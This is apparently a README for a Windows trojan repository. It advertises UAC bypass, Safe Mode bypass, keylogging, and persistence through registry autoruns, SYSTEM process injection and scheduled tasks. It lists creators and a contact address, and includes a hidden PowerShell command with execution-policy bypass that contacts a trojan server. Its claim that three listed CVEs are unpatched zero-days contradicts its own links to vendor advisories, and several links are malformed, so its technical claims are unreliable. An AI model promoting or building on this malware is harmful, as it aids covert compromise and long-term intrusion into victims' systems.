# LOTUXorg

This trojan is a sophisticated multi-vector malware that leverages several powerful zero-day vulnerabilities including CVE-2025-26633, CVE-2025-24985, and CVE-2025-27737 to achieve stealthy privilege escalation and persistent system compromise. It incorporates advanced UAC bypass techniques based on URL protocol hijacking that allow it to execute commands with elevated privileges without triggering user prompts or requiring administrative consent. In addition, the trojan includes a reliable Safe Mode bypass mechanism that ensures it continues to operate even when the system attempts to enter restricted or diagnostic modes designed to block malware activity. For persistence, the trojan employs robust techniques such as registry autorun entries, strategic injection into SYSTEM processes, and scheduled task manipulation, enabling it to maintain foothold across reboots and evade most standard detection and removal methods. The combination of zero-day exploitation, stealthy privilege escalation, and resilient persistence mechanisms makes this trojan highly effective for covert operations and long-term access within compromised environments.

<p align="center">
  <img src="sutx.png" width="400" />
</p>

## Creators
 `@aitorcillo`
 `@3forms`
 `@mitelvireal`
 `@illxumnb`
 `@securitygov`

- Warning: This Trojan is a working PoC, we will not provide any compilation instructions, nor will we assist in the production of this malware for legal reasons. We are not responsible for any damage caused by using this software. You have been warned.

### To ping the Trojan server
It would be the keylogger, etc...

```swift
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"Start-Process cmd -ArgumentList '/c ping -n 1 (IP) >nul' -WindowStyle Hidden\
``` 

## FAQ

#### Question 1

Are the vulnerabilities 0-days? Yes, they are not fixed.

#### Question 2

When do they stop being 0-days? When are they fixed


## Documentation

[CVE-2025-26633]([https://linktodocumentation](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-26633))
[CVE-2025-24985]([https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24985)
[CVE-2025-27737]([https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27737)

> 💡 Contact Us: 0x0A1T0R@proton.me
